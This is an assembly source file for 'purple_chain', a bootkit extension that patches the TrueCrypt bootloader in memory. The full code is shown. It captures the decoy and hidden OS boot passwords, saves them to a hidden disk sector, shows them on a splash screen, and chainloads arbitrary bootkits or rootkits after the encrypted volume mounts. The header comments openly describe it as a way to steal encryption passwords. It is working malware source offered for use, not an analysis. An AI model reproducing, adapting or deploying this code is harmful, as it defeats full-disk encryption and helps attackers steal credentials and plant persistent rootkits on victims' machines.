; ------------------------------------------------------------------------------
; purple_chain - truecrypt bootloader extension               01.2013, armak00ni
; ------------------------------------------------------------------------------
; - file          : purple_chain.asm
; - author verification hash (sha512):
;               7859aa502b1ea17a10f350dbde773db042650d20def203d0e7232675d3da7cf9
;               50f0c3006eb6672dc9db3aab61ff88a943ed3b2df90e261e1217d09c92f54cd3
; ------------------------------------------------------------------------------
; extends the truecrypt bootloader
;
; features: 
;	  - fancy pre truecrypt splash screen
;     - hooks before and after truecrypt mount
;     - fishes the passwords (for decoy and hidden operating system)
;       and stores them on disk for later retrieval
;     - can chainload virtually ANYTHING 
;       (AFTER the truecrypt volume is mounted, BEFORE the os is booted)
;	  - provides a nice boot environment for extensions
;
; this means:
;     - can chainload any bootkit
;     - 1 bootkit installation works for both: the decoy AND the hidden os  ;] 
;     - your bootkit can email you the truecrypt boot passwords  ;]]]
; 
; assemble using nasm
; nasm purple_chain.asm -o purple_chain
; ------------------------------------------------------------------------------

%define		PURPLE_SECTOR		32	; sector to store passwords
%define		PURPLE_CHAIN_SECTOR	33	; start sector for purple_chain
%define		PURPLE_ID			0xc001c0de	; signature

; we are started at 8000:0000h with the truecrypt loader CS in AX
; now we need to restore the original file start
; then we patch the loader for our purposes
; and execute the original loader start
; ------------------------------------------------------------------------------
	jmp		purple_chain_start 							; 0000
	
	add		ax, si ; garbage 							; 0003
	
	; here the custom sector retf's if it wants to boot the original os
	; or it can also jmp 0x8000:0005 (when it needs to destroy the stack)
	jmp		custom_sector_return						; 0005

	; a custom boot extension can read the truecrypt passwords
	; by loading these pointers: [0x8000:0008], and [0x8000:000a]
	; at [0x8000:0008] is a pointer to the bool variable indicating the booted
	; os is hidden (true/!=0) or decoy (false/0)
decoy_password_ptr	dw tc_decoy_password				; 0008
hidden_password_ptr dw tc_hidden_password				; 000a
is_hidden_ptr		dw tc_is_hidden_volume              ; 000c

service_str_decoy_pass_ptr	dw service_str_decoy_pass	; 000e
service_str_hidden_pass_ptr	dw service_str_hidden_pass	; 0010
service_str_running_decoy_ptr dw service_str_running_decoy ; 0012
service_str_running_hidden_ptr	dw service_str_running_hidden ; 0014

service_str_decoy_pass  	db 'Your decoy OS password is: ', 0
service_str_hidden_pass 	db 'Your hidden OS password is: ', 0
service_str_running_decoy 	db 'You are running the decoy OS', 0
service_str_running_hidden 	db 'You are running the hidden OS', 0
	
; === return here from custom sector, to boot OS ===
custom_sector_return:
	mov		ax, cs
	mov		ds, ax
	mov		es, ax
	jmp		do_boot_hd

; === start here ===
purple_chain_start:	
	
	mov		[cs:tc_patch_seg], ax
	mov		es, ax
	
	; save tc stack
	mov		ax, ss
	mov		[cs:tc_stack_seg], ax
	mov		ax, sp
	mov		[cs:tc_stack_ptr], ax

	; setup our own stack
	cli
	xor 	ax, ax
	mov		ss, ax
	mov		sp, 07c00h
	sti	
	
	mov		ax, cs
	mov		ds, ax
		
		
	call	patch1		; password (sword)fish
	call	patch2		; purple_boot

	call	fancy_splash
	call	print_mmap
	call	waitkey

	; restore status and execute truecrypt boot loader
	cli
	mov		ax, [cs:tc_stack_seg]
	mov		ss, ax
	mov		ax, [cs:tc_stack_ptr]
	mov		sp, ax
	sti
	pop		ds
	pop		es
	popa
	mov		ax, [cs:tc_patch_seg]
	push	ax
	push	0x26d2 ; tc boot loader start jmp destination
	retf
	
tc_patch_seg		dw 0
tc_stack_seg		dw 0
tc_stack_ptr		dw 0

; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
; post truecrypt mount boot chain loading:
boot_purple:
	mov		[cs:tc_segment], ax ; save caller segment (0x9000)

	; setup a stack
	cli
	xor 	ax, ax
	mov		ss, ax
	mov		sp, 07c00h
	sti	

	mov 	ax, cs
	mov		ds, ax
	mov 	es, ax
	
	call	init

	call	get_tc_data

	call 	print_mmap
	
	mov		si, boot_str
	call 	print_str_si
	
	call	go_purple

	call	waitkey
	cmp		al, 'c'
	je		boot_cd
	cmp		al, 's'
	je		boot_custom_sector
	jmp		boot_harddisk

;-------------------------------------------------------------------------------
boot_custom_sector:
	call	try_sector
	jmp		boot_harddisk

try_sector:
	mov 	ax, cs
	mov		ds, ax
	mov 	es, ax
	call	get_ntfs_bs
	

	mov		si, enter_sector_str
	call	print_str_si
	xor 	ax, ax
	mov		word [cs:secnum], 0
	call	read_kbd_hex_word
	push	ax
	mov		si, booting_this_sector_str
	call	print_str_si
	pop		ax
	call	print_hex_word_ax
	call	print_newline
	call	waitkey
	cmp		al, '2'
	jl	 	.bootsinglesector
	cmp		al, '8'
	jg		.bootsinglesector
	xor		ah, ah
	sub		al, '0'
; boot multiple sectors:
; load them allready to 9800:0000
	mov		[cs:dap_numblocks], ax
	mov		ax, [cs:secnum]
	mov		[cs:dap_block_nr_lo], ax
	mov		ax, 9800h
	mov		[cs:dap_buffer_ptr_hi], ax
	mov		ax, 0
	mov		[cs:dap_buffer_ptr_lo], ax
	mov		si, dap
	mov		dl, 0x80
	mov		ah, 42h
	int		13h

		; boot custom sector with params:
	; ax:bx = seg to boot sector ntfs
	; also stored on stack as return address
	; it is fixed as 8000:0005, too
	; -> 3 ways to boot the disk from rootkit code:
	;    1) dont touch stack and simply retf
	;    2) jmp far 0x8000:0005
	;
	; also free mem is decreased to address 80000 
	
	xor 	ax, ax
	mov		ds, ax
	mov		ax, 0x200
	mov		[ds:0x413], ax
	
	cli
	xor		dh, dh
	mov		dl, [cs:tc_boot_drive]
	xor 	ax, ax
	mov 	si, ax
	mov		ss, ax
	mov		es, ax

	mov		ax, 40h
	mov		ds, ax
	xor		ax, ax
	
	mov		sp, 0400h
		
	push	08000h			; we can just retf from our custom sector code
	push	custom_sector_return  			;
	
	sti
	
	jmp		0x9800:0x0000
	
	
.bootsinglesector:	
	mov		ax, 1
	mov		[cs:dap_numblocks], ax
	mov		ax, [cs:secnum]
	mov		[cs:dap_block_nr_lo], ax
	mov		ax, cs
	mov		[cs:dap_buffer_ptr_hi], ax
	mov		ax, buffer
	mov		[cs:dap_buffer_ptr_lo], ax
	mov		si, dap
	mov		dl, 0x80
	mov		ah, 42h
	int		13h
	
	; copy sector to 7c00
	
	mov		ax, 7c0h
	mov		es, ax
	mov		si, buffer
	mov		cx, 200h
	xor		di, di
	cld
	rep 	movsb
	
	; boot custom sector with params:
	; ax:bx = seg to boot sector ntfs
	; also stored on stack as return address
	; it is fixed as 8000:0005, too
	; -> 3 ways to boot the disk from rootkit code:
	;    1) dont touch stack and simply retf
	;    2) jmp far 0x8000:0005
	;
	; also free mem is decreased to address 80000 
	
	xor 	ax, ax
	mov		ds, ax
	mov		ax, 0x200
	mov		[ds:0x413], ax
	
	cli
	xor		dh, dh
	mov		dl, [cs:tc_boot_drive]
	xor 	ax, ax
	mov 	si, ax
	mov		ss, ax
	mov		es, ax

	mov		ax, 40h
	mov		ds, ax
	xor		ax, ax
	
	mov		sp, 0400h
		
	push	08000h			; we can just retf from our custom sector code
	push	custom_sector_return  			;
	
	sti
	
	jmp		0x0:0x07c00
	
	
	retn

enter_sector_str		db " enter sector num (hex w): 0x", 0
booting_this_sector_str db 0dh, 0ah, "press 2-8 to read multiple sectors, or any key to boot sector: 0x", 0
;-------------------------------------------------------------------------------
	

read_kbd_hex_word:
	call	waitkey
	mov		[cs:input_c], al
	cmp		al, '0'
	jl		read_kbd_hex_word
	cmp		al, '9'
	jg		.maybe_a_f
	
	sub		al, '0'
	call	storechar	
	jmp		read_kbd_hex_word
	
.maybe_a_f:	
	cmp		al, 'a'
	jl		read_kbd_hex_word
	cmp		al, 'f'
	jg		read_kbd_hex_word
	
	sub		al, 'a'
	add		al, 10
	call	storechar

	jmp		read_kbd_hex_word

	
storechar:
	cbw
	xor 	cx, cx
	mov		cl, [cs:charnum]
	shl		cx, 1
	shl		cx, 1
	shl		ax, cl
	mov		cx, [cs:secnum]
	add		ax, cx
	mov		[cs:secnum], ax
	
	mov		al, [cs:input_c]
	call	print_char_al
	
	mov		al, [cs:charnum]
	dec		al
	mov		[cs:charnum], al
	
	cmp		al, 0xff
	jz		.finish	
	retn

.finish:		
	pop		ax
	mov		ax, [cs:secnum]
	retn

	
secnum				dw 0
charnum				db 3
input_c				db 0
	
;-------------------------------------------------------------------------------
boot_cd:

	call	try_cds
	jmp		boot_harddisk
	
try_cds:
	mov		al, 81h
	mov		[cs:cd_drive], al
	mov		si, try_cd_str
	call	print_str_si

try_cd:
	mov		dl, [cs:cd_drive]
	mov		si, buffer
	mov		ah, 48h
	int		13h
	jc		.nextdrive

	mov		al, [cs:cd_drive]
	call	print_hex_byte_al
	mov		al, ' '
	call	print_char_al
	
	mov		ax, 1
	mov		[cs:dap_numblocks], ax
	mov		ax, 17
	mov		[cs:dap_block_nr_lo], ax
	mov		ax, cs
	mov		[cs:dap_buffer_ptr_hi], ax
	mov		ax, buffer
	mov		[cs:dap_buffer_ptr_lo], ax
	mov		si, dap
	mov		dl, [cs:cd_drive]
	mov		ah, 42h
	int		13h
	jc		.nextdrive
	
	mov		ax, [cs:buffer + 47h]
	mov		[cs:dap_block_nr_lo], ax
	
	mov		si, dap
	mov		dl, [cs:cd_drive]
	mov		ah, 42h
	int		13h
	jc		.nextdrive
	
	mov		ax, [cs:buffer + 28h]
	mov		[cs:dap_block_nr_lo], ax
	
	mov		si, dap
	mov		dl, [cs:cd_drive]
	mov		ah, 42h
	int		13h
	jc		.nextdrive
	
	mov		si, boot_cd_str
	call	print_str_si
	call	waitkey
	
	mov		ax, cs
	mov		ds, ax
		
	mov		ax, 7c0h
	mov		es, ax
	mov		si, buffer
	mov		cx, 800h
	xor		di, di
	cld
	rep 	movsb
	
	cli
	xor		dh, dh
	mov		dl, [cs:cd_drive]
	xor 	ax, ax
	mov 	si, ax
	mov		ss, ax
	mov		es, ax

	mov		ax, 40h
	mov		ds, ax
	
	mov		sp, 0400h
	sti	
	jmp		0x07c0:0x00
	
	retn
	

.nextdrive:
	mov		al, [cs:cd_drive]
	cmp		al, 0ffh
	je		.end
	
	inc		al
	mov		[cs:cd_drive], al
	jmp		try_cd

.end:
	retn
	
cd_drive	db 0	
try_cd_str	db "trying drives: ", 0
boot_cd_str db "... hit key to boot this drive", 0
	
;-------------------------------------------------------------------------------
boot_harddisk:
	
	call	get_ntfs_bs

	; BOOT
do_boot_hd:
	call	ntfs_bs_2_7c00
	; jmp to 0000:7c00h -> BOOT
	cli
	xor		dh, dh
	mov		dl, [cs:tc_boot_drive]
	xor 	ax, ax
	mov 	si, ax
	mov		ss, ax
	mov		es, ax

	mov		ax, 40h
	mov		ds, ax
	
	mov		sp, 0400h
	sti	
	jmp		0x0:0x07c00
	
boot_str	db 0dh, 0ah, "Press any key to boot windows ..."
			db 0dh, 0ah, "       c to boot from cd 8] ..."
			db 0dh, 0ah, "       s to boot custom sector (rootkit) 8]] ...", 0

tc_segment  dw 0

dap:				db 	10h
					db	00h
dap_numblocks:		dw	0000h
dap_buffer_ptr_lo:	dw	0000h
dap_buffer_ptr_hi:	dw  0000h
dap_block_nr_lo:	dw  0
dap_block_nr_hi:	dw  0, 0, 0

; ------------------------------------------------------------------------------
; print start message, go purple
init:
	mov 	si, start_str
	call	print_str_si
	call 	go_purple
		
	retn

start_str 	db "Going purple ...", 0dh, 0ah, 00
	
; ------------------------------------------------------------------------------
get_ntfs_bs:
	; read mbr into buffer
	; locate and read ntfs bs
	; (using chs, as its suficcient usually on win default inst)
	
	; read mbr
	mov		si, msg_loading_mbr
	call	print_str_si
	mov 	ax, 0201h
	mov		bx, buffer
	mov		cx, 1
	mov		dx, 080h
	int 	13h
	jc		print_error
	mov		si, msg_ok_eol
	call	print_str_si
	
	mov		si, buffer

	; get part 1 ntfs bs
	mov		al, [buffer + 01beh + 1] ; h
	mov		[p1_chs_start_h], al
	;
	mov		al, [buffer + 01beh + 2] ; s
	mov		[p1_chs_start_s], al
	;
	mov		al, [buffer + 01beh + 3] ; c
	mov		[p1_chs_start_c], al
	
	; read part 1 ntfs bs
	mov		si, msg_loading_ntfs_bs
	call	print_str_si
	mov		al, [buffer + 01beh + 1]  
	mov 	dh, al
	mov		al, [buffer + 01beh + 2]  
	mov		cl, al
	mov		al, [buffer + 01beh + 3]  
	mov		ch, al
	;
	mov		dl, 080h
	mov 	ax, 0201h
	mov 	bx, ntfs_bs
	int 	13h
	jc		print_error
	
	mov		si, msg_ok_eol
	call	print_str_si
	retn

print_error:
	push 	ax
	mov 	si, errmsg
	call	print_str_si
	pop 	ax
	call	print_hex_byte_al
	retn

errmsg	db "ERROR: AH=", 0
	
p1_chs_start_h	db 0
p1_chs_start_c	db 0
p1_chs_start_s	db 0
p1_lba_start	dd 0

msg_loading_mbr		db "Loading MBR ... ", 0
msg_loading_ntfs_bs db "Loading NTFS/BS ... ", 0
msg_ok_eol			db "OK", 0dh, 0ah, 0

; ------------------------------------------------------------------------------
; copy ntfs bs to 0000:7c00h
ntfs_bs_2_7c00:
	mov		si, copy_mem_msg
	call	print_str_si
	
	mov		ax, 7c0h
	mov		es, ax
	mov		si, ntfs_bs
	mov		cx, 200h
	xor		di, di
	cld
	rep 	movsb
	
	mov 	ax, cs
	mov		es, ax
	ret

copy_mem_msg	db "Copying NTFS/BS to seg 7c0 now ...", 0



; ------------------------------------------------------------------------------
waitkey:
	xor		ah, ah
	int		16h
	retn

; ------------------------------------------------------------------------------
; print_char_al
; output char at cursor, and advance cursor
; input: byte to print in ax
print_char_al:
	mov     bx, 07h
	mov     ah, 0Eh
	int     10h 
	
	retn

; ------------------------------------------------------------------------------
; print_hex_dword_bx_ax bx:ax hi:lo
; output hex byte at cursor, and advance cursor
; input: byte to print in ax
print_hex_word_bx_ax:	
	push	ax
	mov		bx, ax
	call	print_hex_word_ax
	pop 	ax
	call	print_hex_word_ax
	
	retn		
	
; ------------------------------------------------------------------------------
; print_hex_word_ax
; output hex byte at cursor, and advance cursor
; input: byte to print in ax
print_hex_word_ax:	
	push	ax
	rol 	ax, 8
	call	print_hex_byte_al
	pop 	ax
	call	print_hex_byte_al
	
	retn	

; ------------------------------------------------------------------------------
; print_hex_byte_al
; output hex byte at cursor, and advance cursor
; input: byte to print in ax
print_hex_byte_al:	
	mov 	bx, ax
	push 	bx
	
	and		bx, 0f0h
	shr		bx, 4
	mov		ax, [hex_tbl+bx]
	call	print_char_al
	
	pop 	bx
	and 	bx, 0fh
	mov		ax, [hex_tbl+bx]
	call 	print_char_al
	
	retn
hex_tbl db '0123456789abcdef'
	
	
; ------------------------------------------------------------------------------
print_str_si:
	cld
	lodsb
	or 		al,al
	jz 		.end_print
	
	mov     bx, 07h
	mov     ah, 0Eh
	int     10h 
	jmp 	print_str_si
	
.end_print:
	retn
	

; ------------------------------------------------------------------------------
get_tc_data:
	; get stored passwords, or not (initialize)
	call	read_purple_sector

	; tc segment
	mov		ax, [cs:tc_segment]
	mov		ds, ax
	
	; is hidden?
	mov     bx, [ds:4B88h]
    mov     al, [ds:bx+3D4h]
	mov		[cs:tc_is_hidden_volume], al

	; drive num
	mov		al, [ds:4b64h]
	mov     [cs:tc_boot_drive], al

	; copy password, len
	mov		si, 026h		; char *tc_password
	xor		cx, cx
	mov		cl, [ds:22h]	; int tc_password_len
	
	cmp 	byte [cs:tc_is_hidden_volume], 0
	jz 		.is_decoy1
	; hidden
	mov		[cs:tc_hidden_password_len], cl
	mov		di, tc_hidden_password
	jmp		.cont
	
.is_decoy1:	
	; decoy
	mov		[cs:tc_decoy_password_len], cl
	mov		di, tc_decoy_password

	; store decoy/hidden password
.cont:	
	cld
	rep		movsb
	xor		al, al
	stosb ; asciiZ	
	
	mov		ax, cs
	mov		ds, ax
	
	; print it
	call	print_newline

	mov		si, drive_str
	call	print_str_si
	mov		al, [tc_boot_drive]
	call	print_hex_byte_al
	call	print_newline
	
	mov 	si, boot_type_str_start
	call	print_str_si
	mov 	si, boot_type_str_decoy
	cmp 	byte [tc_is_hidden_volume], 0
	jz	    .is_decoy2
	mov		si, boot_type_str_hidden
.is_decoy2:	
	call	print_str_si
	mov 	si, boot_type_str_end
	call	print_str_si

print_passwords:
	; print passwords
	; decoy
	mov 	si, password_str_decoy
	call	print_str_si
	mov 	si, tc_decoy_password
	cmp		byte [tc_decoy_password_len], 0
	jnz		.cont2
	mov		si, password_str_unknown

.cont2:	
	call	print_str_si	
	mov 	si, password_end_str
	call	print_str_si

	; hidden
	mov 	si, password_str_hidden
	call	print_str_si
	mov 	si, tc_hidden_password
	cmp		byte [tc_hidden_password_len], 0
	jnz		.cont3
	mov		si, password_str_unknown

.cont3:	
	call	print_str_si	
	mov 	si, password_end_str
	call	print_str_si
	call	print_newline
	
	retn
	
password_str_decoy		db "> Your truecrypt DECOY  boot password is: '" , 0
password_str_hidden		db "> Your truecrypt HIDDEN boot password is: '" , 0
password_str_unknown	db "(yet unknown)", 0
password_end_str		db "'", 0dh, 0ah, 0
drive_str	 			db "> Your drive is: ", 0
boot_type_str_start 	db "> You are booting the ", 0
boot_type_str_decoy 	db "DECOY",  0
boot_type_str_hidden 	db "HIDDEN", 0
boot_type_str_end		db " system", 0dh, 0ah, 0

tc_is_hidden_volume		db 0
tc_boot_drive			db 0

tc_decoy_password_len	db	 0
tc_decoy_password		resb 65
tc_hidden_password_len  db 0
tc_hidden_password		resb 65
tmp resb 10

; ------------------------------------------------------------------------------
; read purple sector
; check id
; if no id: clear (init) sector
; else: read passwords 
read_purple_sector:
	; read purple sector into buffer
	mov 	ax, 0201h
	mov		bx, buffer
	mov 	cx, PURPLE_SECTOR
	mov		dx, 80h
	int 	13h
	
	cmp		dword [buffer], PURPLE_ID
	je		.noinit

	; init purple sector
	mov		dword [buffer], PURPLE_ID
	
	xor 	al, al
	mov		di, buffer
	add 	di, 8
	mov		cx, 132 ; 2 * 66 = 2 * (64 +1 +1)
	cld
	rep		stosb
	
.noinit:
	mov		si, buffer
	add 	si, 8
	mov		di, tc_decoy_password_len
	mov		cx, 132
	cld
	rep		movsb
	
	retn

; ------------------------------------------------------------------------------
print_newline:
	mov 	si, CR_LF
	call 	print_str_si
	retn
CR_LF db 0dh, 0ah, 0
	
; ------------------------------------------------------------------------------
print_buffer_si:
	mov		cx, 0200h	
	xor		bx, bx

.loop1:
	push 	bx
	push 	cx
	
	mov		ax, bx

	cmp		ax, 16*16
	jne		.no_waitkey
	
	mov		ah, 00
	int 	16h
	
.no_waitkey:	
	
	and		ax, 0fh
	jnz		.no_newline

	mov		ax, 0dh
	call 	print_char_al
	mov 	ax, 0ah
	call 	print_char_al

	pop 	cx
	push	cx
	mov		ax, 0200h
	sub		ax, cx
	shr		ax, 8
	call	print_hex_byte_al
	pop 	cx
	push	cx
	mov		ax, 0200h
	sub		ax, cx
	call	print_hex_byte_al
	mov		ax, ':'
	call	print_char_al
	mov 	ax, ' '
	call	print_char_al

	pop 	cx
	pop 	bx
	push 	bx
	push	cx
	
.no_newline:
	mov 	ax, [si+bx]
	call	print_hex_byte_al
	mov		ax, ' '
	call 	print_char_al
	pop 	cx
	pop		bx
	
	inc		bx
	loop	.loop1
	
	retn
					  
; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------

go_purple:
	mov 	ax, 0b800h
	mov 	es, ax
	xor 	di, di
	add		di, 80*2
	inc		di
	mov		ah, 5fh
	mov		cx, 80*8
.purple_loop1:	
	mov		[es:di], ah
	inc		di
	inc		di
	loop	.purple_loop1

	mov		ah, 0d0h
	mov 	cx, 80*15
.purple_loop2:	
	mov		[es:di], ah
	inc		di
	inc		di
	loop	.purple_loop2
	
	mov		ah, 050h
	mov 	cx, 80*1
.purple_loop3:	
	mov		[es:di], ah
	inc		di
	inc		di
	loop	.purple_loop3
	
	mov		ax, cs
	mov		es, ax
	retn

fancy_splash:
	push 	es
	mov 	ax, 0b800h
	mov 	es, ax

	xor 	di, di
	mov		ax, 05000h
	mov		cx, 80
	rep		stosw
	mov		ax, 0df00h
	mov		cx, 80
	rep		stosw
	mov		ax, 0f000h
	mov		cx, 80
	rep		stosw
	mov		ax, 0df00h
	mov		cx, 80
	rep		stosw
	mov		ax, 05f00h
	mov		cx, 80
	rep		stosw
	
	add 	di, 160
	mov		ax, 08f00h
	mov		cx, 80
	rep		stosw
	
	add 	di, 3*160
	mov		ax, 08f00h
	mov		cx, 160
	rep		stosw	

	mov		ah, 02h		; set cursor pos
	mov		bh, 0
	mov		dh, 2
	mov		dl, 10
	int		10h
	
	mov		si, fancy_msg1
	call	print_str_si
	call	print_newline
	
	mov		ah, 02h		; set cursor pos
	mov		bh, 0
	mov		dh, 6
	mov		dl, 0
	int		10h
	mov		si, fancy_msg2
	call	print_str_si

	mov		ah, 02h		; set cursor pos
	mov		bh, 0
	mov		dh, 0
	mov		dl, 80 - FANCY_MSG0_LEN
	int		10h
	mov		si, fancy_msg0
	call	print_str_si
	
	mov		ah, 02h		; set cursor pos
	mov		bh, 0
	mov		dh, 10
	mov		dl, 0
	int		10h

	; print passwords here
	mov		ax, cs
	mov		es, ax
	call	read_purple_sector
	call	print_passwords
	
	pop		es
	retn
	

fancy_msg0  db "< armak00ni > ", 0
FANCY_MSG0_LEN equ $-fancy_msg0
fancy_msg1  db ".:[ purple_chain ]:.", 0
fancy_msg2	db    "   ^ purple_chain is taking over truecrypt now ^", 0dh, 0ah , 0
press_key_str db " (press any key ...)", 0dh, 0ah,0

; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
print_mmap:
	push 	es
	mov		ax, cs
	mov		es, ax
	mov		si, str_mmap
	call	print_str_si
	xor 	ebx, ebx

.mmap_loop:	
	mov		eax, 0e820h
	mov		edx, 534D4150h ; 'SMAP'
	mov		di, TBL_MMAP
	mov		ecx, 20
	int		15h
	
	jc		.endme
	or 		ebx, ebx
	jz		.endme
	cmp		eax, 534D4150h
	jnz		.endme
	
	; print entry
	
	push	ebx
	
	mov		si, TBL_MMAP + 0
	call	print_qword_si	
	mov		al, ' '
	call	print_char_al
	
	mov 	si, TBL_MMAP + 8
	call	print_qword_si
	mov		al, ' '
	call	print_char_al
	
	mov		si, TBL_MMAP + 16
	lodsw	
	call	print_hex_word_ax
	
	call	print_newline
	
	pop		ebx
	
	jmp .mmap_loop
	
	
.endme:	
	pop 	es
	retn

str_mmap		db "MEMORY MAP:", 0dh, 0ah, 0
str_not_supp 	db "not suppored", 0	

print_qword_si:
	mov		cx, 8
	add 	si, 7
.print_loop:
	push 	cx
	mov		al, [si]
	call	print_hex_byte_al
	dec		si
	pop		cx
	loop	.print_loop
	retn
	

TBL_MMAP resb 30
	
; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
; P A T C H E S 

; === PATCH1 ===
;
; we patch the get shift status shit:
;
; 00001e11 7533                           jnz         0x1e46
; 00001e13 e85ef1                         call        0xf74
; 00001e16 a840                           test        al, 0x40
; 00001e18 7407                           jz          0x1e21
;
; to
;
; 00001e11 740e                           jz          0x1e21
; 00001e13 								  jmp far     [0x8000:patch1_handler]
;
; -> we patch 9 bytes @tc_seg:1f11 

patch1:
; do the patching
	mov		ah, 02h		; set cursor pos
	mov		bh, 0
	mov		dh, 7
	mov		dl, 0
	int		10h
	
	mov		si, patch1_msg
	call	print_str_si
	
	mov		si, patch1_bin
	mov		cx, PATCH1_LEN
	mov		di, 0x1f11
	rep		movsb	

	mov		si, patch_msg_done
	call	print_str_si
	
	retn
	
; what to patch
patch1_bin: 
	db 		0x74, 0x0e			; 		jz 	0x1e21
	mov		ax, cs
	jmp		0x8000:patch1_handler
PATCH1_LEN	equ	$-patch1_bin

patch1_msg 		db "   * applying patch1: password fish ...",  0
patch_msg_done	db " done", 0dh, 0ah, 0

; will be called by the patch
patch1_handler:
	push	ax
	pusha
	push 	es
	mov		ax, 7c0h
	mov		es, ax
	mov 	ax, 0201h
	xor 	bx, bx
	mov 	cx, PURPLE_SECTOR
	mov		dx, 80h
	int 	13h		

	mov		eax, PURPLE_ID
	cmp		dword [es:0], eax
	jz		.skipinit

	mov		dword [es:0], eax
	mov		di, 8
	xor		al, al
	mov		cx, 132
	cld
	rep 	stosb

.skipinit:
	mov		si, 22h
	mov		di, 8
	mov     bx, [ds:4B88h]
	mov     al, [ds:bx+3D4h]
	or 		al, al
	jz		.nothidden
	add 	di, 66
.nothidden:
	movsb	; store password_len
	add		si, 3
	mov 	cx, 64
	rep		movsb
	xor		al, al
	stosb

	mov 	ax, 0301h
	xor		bx, bx
	mov 	cx, PURPLE_SECTOR
	mov		dx, 80h
	int 	13h

	pop		es
	popa
	
	push	0x1f46 ; return at 0x1f46
	retf

; === PATCH2 ===
; 
; overwrite: from tcb:1c5c:
patch2:
; do the patching
	mov		si, patch2_msg
	call	print_str_si
	
	mov		si, patch2_bin
	mov		cx, PATCH2_LEN
	mov		di, 0x1d5c
	rep		movsb	

	mov		si, patch_msg_done
	call	print_str_si
	
	retn

patch2_bin:
	mov byte [0x4407], 0x1	; BootStarted = true;
	mov ax, cs				; save the TC segment (0x9000)
	jmp 0x8000:boot_purple	; boot_purple
PATCH2_LEN equ $ - patch2_bin

patch2_msg 		db "   * applying patch2: purple boot ...", 0

; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------

; we dont't need to copy 1k uninitialized data
ntfs_bs resb 512	; we can jmp 0x8000:0005 from our custom bootsector				  	
buffer resb 2048 ; (for cd)

; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
; ------------------------------------------------------------------------------
